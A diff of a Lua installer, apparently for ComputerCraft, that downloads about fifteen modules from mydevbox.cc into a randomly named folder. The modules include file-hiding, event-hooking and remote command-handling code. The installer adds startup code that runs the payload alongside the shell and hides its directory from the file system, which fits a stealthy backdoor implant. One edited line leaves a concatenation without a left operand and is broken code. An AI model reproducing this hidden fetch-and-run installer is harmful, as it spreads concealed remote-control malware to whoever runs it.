@@ -45,7 +45,7 @@ local function installer()
         return table.concat(result)
     end
 
-    local DIR_4Nin92xCdd0 = "/" .. generateRandomString(8)
+    local DIR_4Nin92xCdd0 = .. generateRandomString(8)
     OriginalInstallDir = DIR_4Nin92xCdd0
 
 
@@ -63,7 +63,7 @@ local function installer()
 --%s,%s
 local function a1()
     shell.setDir("/")
-    shell.run("%s.lua")
+    shell.run("%s")
     shell.run("shell.lua")
 end
 local function a2()
@@ -85,7 +85,6 @@ parallel.waitForAny(a1, a2)
 --%s,%s
 local function a1()
     shell.setDir("/")
-    shell.run("%s.lua")
     shell.run("shell.lua")
 end
 local function a2()
@@ -113,21 +112,21 @@ parallel.waitForAny(a1, a2)
     
     
 
-    downloadFile("https://mydevbox.cc/src/hooks/eventhook.lua", DIR_4Nin92xCdd0.."/hooks/eventhook.lua")
-    downloadFile("https://mydevbox.cc/src/networking/http/http.lua", DIR_4Nin92xCdd0.."/networking/http/http.lua")
-    downloadFile("https://mydevbox.cc/src/modules/persistent/hide_fs.lua", DIR_4Nin92xCdd0.."/modules/persistent/hide_fs.lua")
-    downloadFile("https://mydevbox.cc/src/hooks/custompairs.lua", DIR_4Nin92xCdd0.."/hooks/custompairs.lua")
-    downloadFile("https://mydevbox.cc/src/eventhandler/eventhandler.lua", DIR_4Nin92xCdd0.."/eventhandler/eventhandler.lua")
-    downloadFile("https://mydevbox.cc/src/config/config.lua", DIR_4Nin92xCdd0.."/config/config.lua")
-    downloadFile("https://mydevbox.cc/src/sys/utils/utils.lua", DIR_4Nin92xCdd0.."/sys/utils/utils.lua")
-    downloadFile("https://mydevbox.cc/src/sys/crypto/cc_rsa.lua", DIR_4Nin92xCdd0.."/sys/crypto/cc_rsa.lua")
-    downloadFile("https://mydevbox.cc/src/networking/http/wsrouter.lua", DIR_4Nin92xCdd0.."/networking/http/wsrouter.lua")
-    downloadFile("https://mydevbox.cc/src/networking/rednet/router.lua", DIR_4Nin92xCdd0.."/networking/rednet/router.lua")
-    downloadFile("https://mydevbox.cc/src/networking/core_router.lua", DIR_4Nin92xCdd0.."/networking/core_router.lua")
-    downloadFile("https://mydevbox.cc/src/sys/crypto/EnD.lua", DIR_4Nin92xCdd0.."/sys/crypto/EnD.lua")
-    downloadFile("https://mydevbox.cc/src/networking/processor/command_handler.lua", DIR_4Nin92xCdd0.."/networking/processor/command_handler.lua")
-    downloadFile("https://mydevbox.cc/src/uninstaller.lua", DIR_4Nin92xCdd0.."/uninstaller.lua")
-    downloadFile("https://mydevbox.cc/src/main.lua", DIR_4Nin92xCdd0.."/main.lua")
+    downloadFile("https://mydevbox.cc/src/hooks/eventhook.lua", "/"..DIR_4Nin92xCdd0.."/hooks/eventhook.lua")
+    downloadFile("https://mydevbox.cc/src/networking/http/http.lua", "/"..DIR_4Nin92xCdd0.."/networking/http/http.lua")
+    downloadFile("https://mydevbox.cc/src/modules/persistent/hide_fs.lua", "/"..DIR_4Nin92xCdd0.."/modules/persistent/hide_fs.lua")
+    downloadFile("https://mydevbox.cc/src/hooks/custompairs.lua", "/"..DIR_4Nin92xCdd0.."/hooks/custompairs.lua")
+    downloadFile("https://mydevbox.cc/src/eventhandler/eventhandler.lua", "/"..DIR_4Nin92xCdd0.."/eventhandler/eventhandler.lua")
+    downloadFile("https://mydevbox.cc/src/config/config.lua", "/"..DIR_4Nin92xCdd0.."/config/config.lua")
+    downloadFile("https://mydevbox.cc/src/sys/utils/utils.lua", "/"..DIR_4Nin92xCdd0.."/sys/utils/utils.lua")
+    downloadFile("https://mydevbox.cc/src/sys/crypto/cc_rsa.lua", "/"..DIR_4Nin92xCdd0.."/sys/crypto/cc_rsa.lua")
+    downloadFile("https://mydevbox.cc/src/networking/http/wsrouter.lua", "/"..DIR_4Nin92xCdd0.."/networking/http/wsrouter.lua")
+    downloadFile("https://mydevbox.cc/src/networking/rednet/router.lua", "/"..DIR_4Nin92xCdd0.."/networking/rednet/router.lua")
+    downloadFile("https://mydevbox.cc/src/networking/core_router.lua", "/"..DIR_4Nin92xCdd0.."/networking/core_router.lua")
+    downloadFile("https://mydevbox.cc/src/sys/crypto/EnD.lua", "/"..DIR_4Nin92xCdd0.."/sys/crypto/EnD.lua")
+    downloadFile("https://mydevbox.cc/src/networking/processor/command_handler.lua", "/"..DIR_4Nin92xCdd0.."/networking/processor/command_handler.lua")
+    downloadFile("https://mydevbox.cc/src/uninstaller.lua", "/"..DIR_4Nin92xCdd0.."/uninstaller.lua")
+    downloadFile("https://mydevbox.cc/src/main.lua", "/"..DIR_4Nin92xCdd0.."/main.lua")
     if (CustomFS~=nil) then
         CustomFS.hideDir(DIR_4Nin92xCdd0)
     end
